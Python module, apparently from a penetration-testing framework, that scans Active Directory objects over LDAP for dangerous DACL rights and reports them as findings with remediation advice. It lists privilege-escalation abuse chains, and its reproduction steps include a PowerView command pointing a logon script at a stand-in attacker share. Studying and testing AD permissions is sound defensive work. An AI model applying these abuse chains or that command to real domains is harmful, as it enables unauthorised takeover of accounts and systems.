"""DACL Abuse — identify and exploit dangerous DACL permissions for privesc."""
from __future__ import annotations
import struct, sys, time
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))
from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity
from adforge.core.ldap_client import LdapClient

CVSS = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
CVSS40 = "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"

GENERIC_ALL = 0x10000000
GENERIC_WRITE = 0x40000000
WRITE_DACL = 0x00040000
WRITE_OWNER = 0x00080000
WRITE_PROPERTY = 0x00000020

ABUSE_TECHNIQUES = {
    "GenericAll": "Full control — change password, add to groups, set SPN, modify object",
    "GenericWrite": "Write any attribute — set SPN (Kerberoast), modify logon script",
    "WriteDACL": "Modify ACL — grant yourself GenericAll, then full control",
    "WriteOwner": "Take ownership — then modify DACL → GenericAll → full control",
    "WriteProperty": "Write specific attributes — depends on which property",
}

class DaclAbuse(BaseModule):
    NAME = "dacl_abuse"
    DESCRIPTION = "DACL: identify GenericAll/WriteDACL/WriteOwner abuse chains"
    PHASE = 9
    TAGS = ["acl-abuse", "privesc", "cwe-284"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        dc_ip = self.config.extra.get("dc", self.config.target)
        domain = self.config.extra.get("domain", "")
        if not self.check_scope(dc_ip):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        # Collect dangerous ACEs from previous enum modules
        dangerous_aces = self.config.extra.get("dangerous_aces", [])

        if not dangerous_aces:
            # Do our own quick scan if acl_enum didn't run
            client = LdapClient(dc_ip=dc_ip, domain=domain,
                username=self.config.extra.get("username", ""),
                password=self.config.extra.get("password", ""),
                nt_hash=self.config.extra.get("hash", ""))
            if not client.connect(): return self._make_result(start)
            try:
                await self.rate_limit()
                targets = client.search(
                    "(|(adminCount=1)(objectCategory=group)(objectCategory=computer))",
                    ["sAMAccountName", "nTSecurityDescriptor", "distinguishedName"])

                for obj in targets[:100]:
                    name = str(obj.get("sAMAccountName", "?"))
                    sd = obj.get("nTSecurityDescriptor")
                    if not sd or not isinstance(sd, bytes) or len(sd) < 20:
                        continue
                    aces = self._check_dacl(sd, name)
                    dangerous_aces.extend(aces)
            finally:
                client.disconnect()

        # Group by abuse type
        by_right: dict[str, list] = {}
        for ace in dangerous_aces:
            right = ace.get("right", "Unknown")
            by_right.setdefault(right, []).append(ace)

        # Generate attack chain findings
        for right, aces in by_right.items():
            technique = ABUSE_TECHNIQUES.get(right, "Unknown abuse technique")
            ev = Evidence(extra={"aces": aces[:15], "technique": technique})
            self.new_finding(
                title=f"DACL Abuse: {right} on {len(aces)} object(s)",
                severity=Severity.HIGH,
                description=(
                    f"{right} permission found on {len(aces)} AD object(s):\n"
                    + "\n".join(f"  {a['principal']} → {a['target']}" for a in aces[:10])
                    + f"\n\nAbuse: {technique}"
                ),
                reproduction_steps=[
                    "# BloodHound: Mark owned → find shortest path to Domain Admin",
                    f"# PowerView: Set-DomainObject -Identity target -Set @{{scriptpath='\\\\attacker\\evil.ps1'}}",
                ],
                remediation=f"Remove {right} from non-admin principals on sensitive objects.",
                references=["CWE-284", "MITRE T1222"],
                evidence=ev, cvss_v31_vector=CVSS, cvss_v40_vector=CVSS40,
                mitre_attack=["TA0005/T1222"],
                target=dc_ip)

        return self._make_result(start)

    def _check_dacl(self, sd: bytes, target_name: str) -> list[dict]:
        aces = []
        try:
            offset_dacl = struct.unpack("<I", sd[16:20])[0]
            if offset_dacl == 0 or offset_dacl >= len(sd): return aces
            acl = sd[offset_dacl:]
            if len(acl) < 8: return aces
            ace_count = struct.unpack("<H", acl[4:6])[0]
            pos = 8
            rights_map = {GENERIC_ALL: "GenericAll", GENERIC_WRITE: "GenericWrite",
                          WRITE_DACL: "WriteDACL", WRITE_OWNER: "WriteOwner"}
            for _ in range(min(ace_count, 200)):
                if pos + 8 > len(acl): break
                ace_type = acl[pos]
                ace_size = struct.unpack("<H", acl[pos+2:pos+4])[0]
                if ace_size < 4 or pos + ace_size > len(acl): break
                if ace_type == 0:
                    mask = struct.unpack("<I", acl[pos+4:pos+8])[0]
                    for rmask, rname in rights_map.items():
                        if mask & rmask:
                            sid_data = acl[pos+8:pos+ace_size]
                            sid_str = self._quick_sid(sid_data)
                            if not sid_str.startswith("S-1-5-18"):
                                aces.append({"target": target_name, "right": rname, "principal": sid_str})
                pos += ace_size
        except Exception:
            pass
        return aces

    def _quick_sid(self, data: bytes) -> str:
        try:
            if len(data) < 8: return "S-?-?"
            rev = data[0]; sc = data[1]; auth = int.from_bytes(data[2:8], "big")
            subs = [struct.unpack("<I", data[8+i*4:12+i*4])[0] for i in range(min(sc, 15)) if 12+i*4 <= len(data)]
            return f"S-{rev}-{auth}" + "".join(f"-{s}" for s in subs)
        except Exception:
            return "S-?-?"

class TestDaclAbuse:
    def test_techniques(self) -> None: assert "GenericAll" in ABUSE_TECHNIQUES
    def test_phase(self) -> None: assert DaclAbuse.PHASE == 9
